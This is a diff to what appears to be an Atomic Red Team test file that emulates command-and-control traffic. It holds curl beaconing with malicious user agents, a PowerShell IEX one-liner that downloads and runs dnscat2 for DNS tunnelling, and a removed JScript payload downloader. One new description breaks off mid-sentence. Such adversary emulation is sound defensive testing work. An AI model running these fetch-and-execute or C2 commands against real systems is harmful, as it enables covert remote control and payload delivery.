@@ -5,9 +5,10 @@ display_name: Standard Application Layer Protocol
 atomic_tests:
 - name: Malicious User Agents - Powershell
   description: |
-    This test simulates an infected host beaconing to command and control.
-    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+    This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. Use an application like Wireshark to record the session
+    and observe user agent strings.
 
+    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
   supported_platforms:
     - windows
   input_arguments:
@@ -26,9 +27,9 @@ atomic_tests:
 
 - name: Malicious User Agents - CMD
   description: |
-    This test simulates an infected host beaconing to command and control.
-    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+    This test simulates an infected host beaconing to command and control. Upon execution, large amounts of website source code and
 
+    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
   supported_platforms:
     - windows
   input_arguments:
@@ -39,10 +40,10 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      curl -s -A "HttpBrowser/1.0" -m3 #{domain}
-      curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
-      curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
-      curl -s -A "*<|>*" -m3 #{domain}
+      curl -s -A "HttpBrowser/1.0" -m3 #{domain} >nul 2>&1
+      curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >nul 2>&1
+      curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >nul 2>&1
+      curl -s -A "*<|>*" -m3 #{domain} >nul 2>&1
 
 - name: Malicious User Agents - Nix
   description: |
@@ -185,29 +186,3 @@ atomic_tests:
     command: |
       IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
       Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
-
-- name: OSTap Payload Download
-  description: |
-    Uses cscript //E:jscript to download a file
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    script_file:
-      description: File to execute jscript code from
-      type: Path
-      default: '%TEMP%\OSTapGet.js'
-    file_url:
-      description: URL to retrieve file from
-      type: Url
-      default: https://128.30.52.100/TR/PNG/iso_8859-1.txt
-
-  executor:
-    name: command_prompt
-    elevation_required: false
-    command: |
-      echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
-      cscript //E:Jscript #{script_file}
-    cleanup_command: |
-      del #{script_file} /F /Q >nul 2>&1
